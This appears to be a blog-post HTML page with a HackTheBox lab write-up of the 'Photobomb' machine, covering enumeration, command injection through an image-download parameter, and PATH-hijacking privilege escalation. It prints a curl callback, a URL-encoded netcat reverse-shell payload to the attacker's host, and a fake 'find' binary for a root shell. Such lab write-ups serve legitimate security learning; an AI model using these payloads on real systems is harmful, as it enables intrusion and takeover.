@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Photobomb</h1>
+        <img class="box-icon" src="/hack/images/photobomb.png"></img>
+        <p><i>Compromised on February 7, 2023</br>Written on February 4, 2024</i></p>
+        <p>Photobomb is my fifth machine to compromise on HackTheBox. This Linux machine features hardcoded credentials in a .js file, 
+            Command Injection vulnerability for a low-privileged user, and a script that uses a binary without specifying it's absolute path.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.11.182 -p- --min-rate=5000</code></pre>
+        <img src="../images/photobomb1.png">
+        <p>We see that only ports 22 and 80 are open. Let's get more info on them by using Nmap.</p>
+        <pre><code>nmap 10.10.11.182 -p22,80 -sC -sV --min-rate=5000</code></pre>
+        <img src="../images/photobomb2.png">
+        <h3>Website - TCP Port 80</h3>
+        <p>Navigating to the website brings an error.</p>
+        <img src="../images/photobomb3.png">
+        <p>For this, I added photobomb.htb to my /etc/hosts file and pointed it to 10.10.11.182.</p>
+        <img src="../images/photobomb4.png">
+        <p>Navigating to the website again brings us this:</p>
+        <img src="../images/photobomb5.png">
+        <p>Clicking around the website, there is a "click here!" button on the front page. This will redirect us to /printer, but it requires authentication.</p>
+        <img src="../images/photobomb6.png">
+        <p>Common credentials don't work, but if we view the source code, we can find a file named photobomb.js. Inside the .js file, we can also find credentials to the /printer subdirectory.</p>
+        <img src="../images/photobomb7.png">
+        <p>We can now access the /printer subdirectory, which brings us this page:</p>
+        <img src="../images/photobomb8.png">
+        <p>Exploring the page, it has a functionality that downloads a selected image in a desired size and format.</p>
+        <img src="../images/photobomb9.png">
+        <p>My initial thoughts are that the website might be using a system command to convert an original image to a specified size and format. It is unlikely that the website is storing a 
+            different image for different dimensions and formats. To confirm this, I used Burpsuite to intercept the download request and change the requested dimension to a value that's not listed
+            as an option, such as 10x10. It successfully downloads.</p>
+        <img src="../images/photobomb10.png">
+        <p>This means we could try using Command Injection to execute commands on the machine.</p>
+        
+        <h2>Exploit</h2>
+        <p>To confirm the vulnerability, we start up an HTTP server that will show all requests sent to our machine.</p>
+        <pre><code>python3 -m http.server</code></pre>
+        <img src="../images/photobomb11.png">
+        <p>Then we try to execute a command on the target machine that will send a request to our HTTP server. After trial and error,
+            the "filetype" parameter is vulnerable to Command Injection. </p>
+        <pre><code>filetype=png;curl%20http://10.10.14.3:8000/test</code></pre>
+        <img src="../images/photobomb12.png">
+        <p>Now let's get a reverse shell on the target machine. First we'll start our listener.</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/photobomb13.png">
+        <p>Then we'll execute a command on the target machine to send a reverse shell to our listener.</p>
+        <pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.3%204444%20%3E%2Ftmp%2Ff</code></pre>
+        <img src="../images/photobomb14.png">
+        <p>We have a reverse shell on the target machine as user "wizard"</p>
+        <img src="../images/photobomb15.png">
+        <p>We got the user flag.</p>
+        <pre><code>cd</br>cat user.txt</code></pre>
+        <img src="../images/photobomb15a.png">
+
+        <h2>Privilege Escalation</h2>
+        <p>Now that we have a low-privileged user on the target machine, I searched for commands that the user can execute as root. It seems like
+            we can run a bash script as root. Additionally, the "SETENV" tells us that we set our own environment variables. </p>
+        <pre><code>sudo -l</code></pre>
+        <img src="../images/photobomb16.png">
+        <p>Inspecting the /opt/cleanup.sh script, there are commands being used that are not using an absolute path. The last line executes the 
+            "find" binary without using an absolute path.</p>
+        <pre><code>cat /opt/cleanup.sh</code></pre>
+        <img src="../images/photobomb17.png">
+        <p>This means that the system will use the $PATH variable to find where the "find" binary is. When executing the /opt/cleanup.sh script,
+            the system will parse through the $PATH variable (This variable contains locations in the file system) from left to right and tries 
+            to find the "find" binary in those locations. Due to "SETENV", we can change the $PATH variable to look in a location that has a malicious
+            "find" binary and execute it.</p>
+        <p>First I create my malicious "find" binary in the /tmp directory, which simply executes a bash shell. I also added execute permissions to it.</p>
+        <pre><code>echo "/bin/bash" > /tmp/find</br>chmod +x /tmp/find</code></pre>
+        <img src="../images/photobomb18.png">
+        <p>Then we execute the /opt/cleanup.sh script as root, while also adding /tmp into the $PATH variable that the system will use as root.
+            When the script runs, the system will check our $PATH variable first and checks for the "find" binary in the /tmp directory. Then the system will use
+            our created "find" binary and spawns a root shell.
+        </p>
+        <pre><code>sudo PATH=/tmp:$PATH /opt/cleanup.sh</br>whoami</code></pre>
+        <img src="../images/photobomb19.png">
+        <p>We got the root flag.</p>
+        <pre><code>cat /root/root.txt</code></pre>
+        <img src="../images/photobomb20.png">
+
+
+
+
+        
+
+
+    </div>
+</bo11dy>
+
+</html>
